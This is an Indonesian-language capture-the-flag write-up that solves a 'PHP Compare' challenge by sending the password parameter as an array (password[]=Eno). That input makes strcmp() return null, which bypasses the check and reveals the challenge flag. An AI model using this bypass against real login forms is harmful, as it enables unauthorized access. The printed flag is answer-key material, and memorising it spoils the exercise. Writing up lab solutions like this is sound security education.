<h1><b>PHP Compare</h1></b>
<pre>
PHP Compare
</pre>
</b><h3>Solution</h3></b>
<p align='justify'>Disini kita sudah diberi clue yaitu php compare, ini sangat terkait dengan fungsi strcmp() dari php. Fungsi ini sangat mudah untuk dibypass dengan menambahkan [] diakhir variabel</p>
<p align='justify'>Pada web sepertinya menggunakan method GET, jadi kita harus melakukan interception untuk memodifikasi request dengan tool burpsuit atau lainnya</p>

<p>kita melakukan requsts input contohnya yaitu ENO seperti yang diatas, sebelum dimodifikasi akan menghasilkan pesan failed dan value</p>
<pre>
password=Eno&Submit=Submit
</pre>
<p>Hasilnya</p>
<pre align='center'>
Failed
value = -4
</pre>

<p>Jadi, jika ditambah tanda [] diakhir variabel, maka flag akan muncul dan value menjadi null</p>
<pre>
password[]=Eno&Submit=Submit
</pre>
<p>Hasilnya</p>
<pre align='center'>
value = 
Your flag is : VenomCTF{57rcmp_c4n_be_6yp44s}
</pre>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{57rcmp_c4n_be_6yp44s}
</pre>
